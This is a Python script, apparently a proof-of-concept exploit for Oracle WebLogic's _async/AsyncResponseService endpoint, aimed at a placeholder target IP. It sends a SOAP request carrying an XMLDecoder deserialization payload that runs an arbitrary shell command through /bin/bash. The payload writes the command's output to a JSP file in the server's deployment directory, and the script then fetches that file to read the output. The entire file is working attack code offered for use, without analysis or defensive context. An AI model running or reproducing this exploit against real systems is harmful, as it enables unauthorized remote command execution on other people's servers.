#!usr/bin/env python
# !coding=utf-8

__author__ = 'JimZ'

import requests

common = 'ifconfig'

url = 'http://xxx.xxx.xxx.xxx:7001/'

vul_url = url + "_async/AsyncResponseService"

headers = {
    "Accept-Encoding": "gzip, deflate",
    "SOAPAction": "",
    "Accept": "*/*",
    "User-Agent": "Apache-HttpClient/4.1.1 (java 1.5)",
    "content-type": "text/xml",
    "Connection": "keep-alive"
}

dataxml = """
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java class="java.beans.XMLDecoder"><void class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>/bin/bash</string></void><void index="1"><string>-c</string></void><void index="2"><string>{0}> servers/AdminServer/tmp/_WL_internal/bea_wls_deployment_internal/gyuitk/war/aaa.jsp</string></void></array><void method="start"/></void>
</java>    </work:WorkContext>   </soapenv:Header>   <soapenv:Body>      <asy:onAsyncDelivery/>   </soapenv:Body></soapenv:Envelope>
""".format(common)
try:
    response = requests.post(vul_url, data=dataxml, headers=headers)
    if(response.status_code== 202):
        return_url = url+ "bea_wls_deployment_internal/aaa.jsp"
        response = requests.get(return_url)
        print(response.text)
except:
    pass
